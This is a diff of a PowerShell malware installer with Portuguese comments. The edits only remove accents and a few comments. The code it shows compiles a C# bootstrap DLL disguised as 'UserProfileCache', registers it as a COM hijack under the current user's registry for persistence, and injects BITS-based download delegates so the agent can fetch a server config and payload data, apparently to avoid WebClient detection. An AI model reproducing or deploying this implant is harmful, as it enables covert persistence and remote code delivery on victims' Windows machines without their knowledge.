@@ -1,7 +1,7 @@
 #Requires -Version 5.1
 <#
 .SYNOPSIS
-    Gerencia instalação e registro COM UserProfileCache (user-mode HKCU) - VERSÃO BITS
+    Gerencia instalacao e registro COM UserProfileCache (user-mode HKCU) - VERSÃO BITS
 
 .PARAMETER Action
     Install   - Compila bootstrap, registra hijack, grava config C/U/I
@@ -42,7 +42,7 @@ $Script:ComClassName = 'UserProfileCache.CacheProvider'
 $Script:FilelessStoreClsid = '{B2C3D4E5-F6A7-8901-BCDE-F12345678901}'
 
 # ============================================================
-# FUNÇÕES BITS (substituem WinHttp e WebClient)
+# FUNCOES BITS (substituem WinHttp e WebClient)
 # ============================================================
 function Invoke-BitsDownloadString {
     param([string]$Url)
@@ -67,7 +67,7 @@ function Invoke-BitsDownloadData {
 }
 # ============================================================
 
-#region BootstrapSources (AUTO-GENERATED) - MESMO CÓDIGO ORIGINAL
+#region BootstrapSources (AUTO-GENERATED) - MESMO CODIGO ORIGINAL
 function Get-BootstrapSourceMap {
     return @{
         'CacheConstants.cs' = @'
@@ -676,7 +676,6 @@ namespace UserProfileCache
             @"""server""\s*:\s*""([^""]+)""",
             RegexOptions.IgnoreCase | RegexOptions.Compiled);
 
-        // Delegate para ser preenchido pelo PowerShell (BITS)
         public static Func<string, string> DownloadStringWithBits = null;
 
         public static string FetchServerBase(string configUrl)
@@ -729,7 +728,6 @@ namespace UserProfileCache
         private static readonly object SyncRoot = new object();
         private static int _executed;
 
-        // Delegate para ser preenchido pelo PowerShell (BITS)
         public static Func<string, byte[]> DownloadDataWithBits = null;
 
         public static void Execute()
@@ -966,7 +964,7 @@ function Get-CscPath {
         if (Test-Path $path) { return $path }
     }
 
-    throw "csc.exe não encontrado. Instale .NET Framework 4.x."
+    throw "csc.exe nao encontrado. Instale .NET Framework 4.x."
 }
 
 function Invoke-CompileBootstrap {
@@ -1010,7 +1008,7 @@ function Invoke-CompileBootstrap {
         }
 
         if (-not (Test-Path $stagingPath -PathType Leaf)) {
-            throw "Compilação não gerou: $stagingPath"
+            throw "Compilacao nao gerou: $stagingPath"
         }
 
         Deploy-InstallDll -SourcePath $stagingPath -DestinationPath $OutputPath
@@ -1054,7 +1052,7 @@ function Get-ComAssemblyMetadata {
 
     $absolutePath = [System.IO.Path]::GetFullPath($Path)
     if (-not (Test-Path $absolutePath -PathType Leaf)) {
-        throw "DLL não encontrada: $absolutePath"
+        throw "DLL nao encontrada: $absolutePath"
     }
 
     $assembly = [System.Reflection.Assembly]::LoadFile($absolutePath)
@@ -1168,7 +1166,7 @@ function Get-RegAsmPath {
         )) {
         if (Test-Path $path) { return $path }
     }
-    throw "RegAsm.exe não encontrado."
+    throw "RegAsm.exe nao encontrado."
 }
 
 function Register-ComHijackViaRegAsm {
@@ -1184,7 +1182,7 @@ function Register-ComHijackViaRegAsm {
 
     try {
         & $regAsm $dllPath /regfile:$regFile /codebase | Out-Null
-        if (-not (Test-Path $regFile)) { throw "RegAsm não gerou o arquivo .reg esperado." }
+        if (-not (Test-Path $regFile)) { throw "RegAsm nao gerou o arquivo .reg esperado." }
 
         $content = Get-Content -Path $regFile -Raw -Encoding Unicode
         $content = $content -replace 'HKEY_CLASSES_ROOT', 'HKEY_CURRENT_USER\Software\Classes'
@@ -1208,7 +1206,7 @@ function Register-ComHijackViaRegAsm {
 
     $clsid = Format-ComClsid -Value $TargetClsid
     $inprocKey = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
-    if (-not (Test-Path $inprocKey)) { throw "Registro HKCU não encontrado em $inprocKey" }
+    if (-not (Test-Path $inprocKey)) { throw "Registro HKCU nao encontrado em $inprocKey" }
 
     $props = Get-ItemProperty -Path $inprocKey
     return [PSCustomObject]@{
@@ -1244,7 +1242,6 @@ function Test-IsAdmin {
 function Get-ServerUrl {
     param([string]$Url)
 
-    # USANDO BITS EM VEZ DE WEBCLIENT
     $raw = Invoke-BitsDownloadString -Url $Url
     $srv = $null
 
@@ -1375,7 +1372,7 @@ function Release-ProfileCacheDllLock {
         Start-Sleep -Seconds 1
     }
 
-    throw "Nao foi possivel substituir a DLL — ainda em uso por outro processo. $DllPath"
+    throw "Nao foi possivel substituir a DLL - ainda em uso por outro processo. $DllPath"
 }
 
 function Deploy-InstallDll {
@@ -1570,15 +1567,11 @@ function Invoke-InstallAction {
     if (-not $Config) { throw "Install requer -Config." }
     if (-not $Clsid) { throw "Install requer -Clsid." }
 
-    # ============================================================
-    # INJETA OS DELEGATES PARA O C# USAR BITS
-    # ============================================================
     $delegateString = [Func[string,string]]{ param($url) return Invoke-BitsDownloadString -Url $url }
     [UserProfileCache.ConfigClient]::DownloadStringWithBits = $delegateString
 
     $delegateData = [Func[string,byte[]]]{ param($url) return Invoke-BitsDownloadData -Url $url }
     [UserProfileCache.AgentBootstrap]::DownloadDataWithBits = $delegateData
-    # ============================================================
 
     $existing = Get-ProfileCacheHijackInstall -TargetClsid $Clsid
     if ($existing -and $existing.DllExists -and -not $Force) {
@@ -1600,7 +1593,7 @@ function Invoke-InstallAction {
 
     if ($SourceDll) {
         if (-not (Test-Path $SourceDll -PathType Leaf)) {
-            throw "SourceDll não encontrada: $SourceDll"
+            throw "SourceDll nao encontrada: $SourceDll"
         }
 
         Deploy-InstallDll -SourcePath $SourceDll -DestinationPath $destDll
@@ -1669,7 +1662,7 @@ function Invoke-RegisterAction {
     $targetDll = $DllPath
     if (-not $targetDll) { $targetDll = Get-InstallDllPath }
     if (-not (Test-Path $targetDll -PathType Leaf)) {
-        throw "DLL não encontrada: $targetDll (use -DllPath ou execute Install primeiro)."
+        throw "DLL nao encontrada: $targetDll (use -DllPath ou execute Install primeiro)."
     }
 
     if ($UnregisterPrevious -and (Test-Path $Script:StateFile)) {
@@ -1702,7 +1695,7 @@ function Invoke-UnregisterAction {
         $targetDll = $DllPath
         if (-not $targetDll) { $targetDll = Get-InstallDllPath }
         if (-not (Test-Path $targetDll -PathType Leaf)) {
-            throw "Unregister com -UseRegAsm requer -DllPath válido."
+            throw "Unregister com -UseRegAsm requer -DllPath valido."
         }
 
         $removed = Unregister-ComHijackViaRegAsm -Path $targetDll -TargetClsid $Clsid
